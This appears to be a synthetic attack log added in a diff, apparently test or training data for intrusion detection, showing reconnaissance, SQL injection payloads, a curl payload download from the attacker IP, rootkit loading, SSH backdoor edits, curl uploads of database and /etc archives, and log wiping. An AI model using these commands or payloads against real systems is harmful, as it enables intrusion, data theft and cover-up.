@@ -1,0 +1,78 @@
+# Attack Scenario: Compromised Web Server Leading to Data Exfiltration
+# Timeline: 2024-01-15 14:00 - 16:30 UTC
+# This log demonstrates a multi-stage attack including reconnaissance, exploitation, and exfiltration
+
+# Stage 1: Reconnaissance (14:00 - 14:15)
+2024-01-15 14:00:12 INFO [nginx] 45.33.32.156 - - "GET / HTTP/1.1" 200 5432
+2024-01-15 14:00:15 INFO [nginx] 45.33.32.156 - - "GET /robots.txt HTTP/1.1" 200 156
+2024-01-15 14:00:18 INFO [nginx] 45.33.32.156 - - "GET /.git/config HTTP/1.1" 404 0
+2024-01-15 14:00:21 INFO [nginx] 45.33.32.156 - - "GET /.env HTTP/1.1" 404 0
+2024-01-15 14:00:24 INFO [nginx] 45.33.32.156 - - "GET /wp-admin/ HTTP/1.1" 404 0
+2024-01-15 14:00:27 INFO [nginx] 45.33.32.156 - - "GET /admin HTTP/1.1" 302 0
+2024-01-15 14:00:30 INFO [nginx] 45.33.32.156 - - "GET /api/v1/users HTTP/1.1" 401 89
+2024-01-15 14:00:33 INFO [nginx] 45.33.32.156 - - "GET /api/v1/config HTTP/1.1" 401 89
+2024-01-15 14:05:00 INFO [nginx] 45.33.32.156 - - "GET /api/v1/version HTTP/1.1" 200 45
+2024-01-15 14:05:03 WARNING [modsecurity] [id "920350"] Host header is a numeric IP address from 45.33.32.156
+2024-01-15 14:10:22 INFO [nginx] 45.33.32.156 - - "OPTIONS /api/v1/upload HTTP/1.1" 200 0
+
+# Stage 2: Exploitation - SQL Injection Attempts (14:15 - 14:30)
+2024-01-15 14:15:01 INFO [nginx] 45.33.32.156 - - "GET /api/v1/search?q=test HTTP/1.1" 200 234
+2024-01-15 14:15:05 WARNING [nginx] 45.33.32.156 - - "GET /api/v1/search?q=test'%20OR%20'1'='1 HTTP/1.1" 500 0
+2024-01-15 14:15:06 ERROR [app] SQL Error: You have an error in your SQL syntax near '1'='1'
+2024-01-15 14:15:10 WARNING [nginx] 45.33.32.156 - - "GET /api/v1/search?q=test'%20UNION%20SELECT%20NULL-- HTTP/1.1" 500 0
+2024-01-15 14:15:11 ERROR [app] SQL Error: The used SELECT statements have a different number of columns
+2024-01-15 14:15:15 WARNING [nginx] 45.33.32.156 - - "GET /api/v1/search?q=test'%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1" 200 156
+2024-01-15 14:15:20 WARNING [modsecurity] [id "942100"] SQL Injection Attack Detected via libinjection from 45.33.32.156
+2024-01-15 14:20:01 WARNING [nginx] 45.33.32.156 - - "GET /api/v1/search?q='%20UNION%20SELECT%20username,password,email%20FROM%20users-- HTTP/1.1" 200 8934
+2024-01-15 14:20:02 ERROR [modsecurity] [id "942190"] Detects MSSQL code execution and information gathering attempts from 45.33.32.156
+2024-01-15 14:25:33 WARNING [nginx] 45.33.32.156 - - "GET /api/v1/search?q='%20UNION%20SELECT%20table_name,NULL,NULL%20FROM%20information_schema.tables-- HTTP/1.1" 200 2341
+
+# Stage 3: Credential Theft and Privilege Escalation (14:30 - 15:00)
+2024-01-15 14:30:00 INFO [nginx] 45.33.32.156 - - "POST /api/v1/login HTTP/1.1" 200 512
+2024-01-15 14:30:01 WARNING [app] Successful login for user 'admin' from unusual IP 45.33.32.156
+2024-01-15 14:30:05 INFO [nginx] 45.33.32.156 - - "GET /api/v1/admin/users HTTP/1.1" 200 15234
+2024-01-15 14:30:10 INFO [nginx] 45.33.32.156 - - "GET /api/v1/admin/config HTTP/1.1" 200 2341
+2024-01-15 14:35:22 INFO [nginx] 45.33.32.156 - - "POST /api/v1/admin/users HTTP/1.1" 201 89
+2024-01-15 14:35:23 WARNING [app] New admin user 'svc_backup' created by admin from 45.33.32.156
+2024-01-15 14:40:00 INFO [nginx] 45.33.32.156 - - "PUT /api/v1/admin/config HTTP/1.1" 200 45
+2024-01-15 14:40:01 WARNING [app] System configuration modified: debug_mode enabled by admin
+2024-01-15 14:45:11 INFO [sshd] Accepted password for svc_backup from 45.33.32.156 port 54321 ssh2
+2024-01-15 14:45:15 INFO [sudo] svc_backup : TTY=pts/2 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/bash
+2024-01-15 14:50:00 WARNING [auditd] EXECVE: /usr/bin/curl -o /tmp/.hidden http://45.33.32.156:8080/payload
+
+# Stage 4: Persistence Mechanism Installation (15:00 - 15:30)
+2024-01-15 15:00:05 WARNING [auditd] EXECVE: /bin/chmod +x /tmp/.hidden
+2024-01-15 15:00:10 WARNING [auditd] EXECVE: /tmp/.hidden --install
+2024-01-15 15:05:00 INFO [systemd] Created symlink /etc/systemd/system/multi-user.target.wants/system-update.service
+2024-01-15 15:05:01 WARNING [auditd] FILE_WRITE: /etc/systemd/system/system-update.service by uid=0
+2024-01-15 15:10:22 WARNING [auditd] EXECVE: /usr/bin/crontab -e by svc_backup
+2024-01-15 15:10:23 INFO [cron] (svc_backup) REPLACE (svc_backup)
+2024-01-15 15:15:00 WARNING [kernel] Loading module: rootkit.ko (UNSIGNED)
+2024-01-15 15:15:01 ERROR [kernel] module verification failed: signature and/or required key missing
+2024-01-15 15:20:33 WARNING [auditd] EXECVE: /bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+2024-01-15 15:25:00 INFO [sshd] Server listening on 0.0.0.0 port 22.
+2024-01-15 15:25:01 WARNING [auditd] FILE_WRITE: /root/.ssh/authorized_keys by uid=0
+
+# Stage 5: Data Exfiltration (15:30 - 16:30)
+2024-01-15 15:30:00 WARNING [auditd] EXECVE: /usr/bin/mysqldump -u root -p'[REDACTED]' --all-databases > /tmp/db_dump.sql
+2024-01-15 15:35:22 INFO [kernel] TCP connection established to 45.33.32.156:443 from local port 54892
+2024-01-15 15:35:25 WARNING [auditd] EXECVE: /usr/bin/curl -X POST -F 'file=@/tmp/db_dump.sql' https://45.33.32.156/upload
+2024-01-15 15:40:00 WARNING [auditd] EXECVE: /bin/tar czf /tmp/www_backup.tar.gz /var/www/html
+2024-01-15 15:45:11 WARNING [auditd] EXECVE: /usr/bin/curl -X POST -F 'file=@/tmp/www_backup.tar.gz' https://45.33.32.156/upload
+2024-01-15 15:50:00 INFO [kernel] Large outbound data transfer: 156MB to 45.33.32.156:443
+2024-01-15 15:55:33 WARNING [auditd] EXECVE: /bin/tar czf /tmp/etc_backup.tar.gz /etc
+2024-01-15 16:00:00 WARNING [auditd] EXECVE: /usr/bin/curl -X POST -F 'file=@/tmp/etc_backup.tar.gz' https://45.33.32.156/upload
+2024-01-15 16:05:22 INFO [kernel] Large outbound data transfer: 45MB to 45.33.32.156:443
+
+# Stage 6: Log Tampering Attempt (16:05 - 16:30)
+2024-01-15 16:10:00 WARNING [auditd] FILE_WRITE: /var/log/auth.log by uid=0 (truncate)
+2024-01-15 16:10:01 WARNING [auditd] EXECVE: /bin/rm -f /tmp/db_dump.sql /tmp/www_backup.tar.gz /tmp/etc_backup.tar.gz
+2024-01-15 16:15:33 WARNING [auditd] EXECVE: /usr/bin/history -c
+2024-01-15 16:15:34 WARNING [auditd] FILE_WRITE: /root/.bash_history (truncate)
+2024-01-15 16:20:00 INFO [sshd] Disconnected from 45.33.32.156 port 54321
+2024-01-15 16:25:11 INFO [sshd] Connection closed by 45.33.32.156 port 54892
+
+# Detection by Security Tools (16:30)
+2024-01-15 16:30:00 CRITICAL [ids] ALERT: Multiple high-severity events detected from 45.33.32.156
+2024-01-15 16:30:01 CRITICAL [siem] Correlation rule triggered: "Potential Data Breach - Exfiltration Pattern"
+2024-01-15 16:30:02 WARNING [fail2ban] Ban 45.33.32.156 for malicious activity
